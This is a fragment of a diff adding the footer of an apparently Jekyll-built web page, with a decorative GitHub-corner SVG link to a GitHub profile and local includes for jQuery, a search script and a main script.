+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
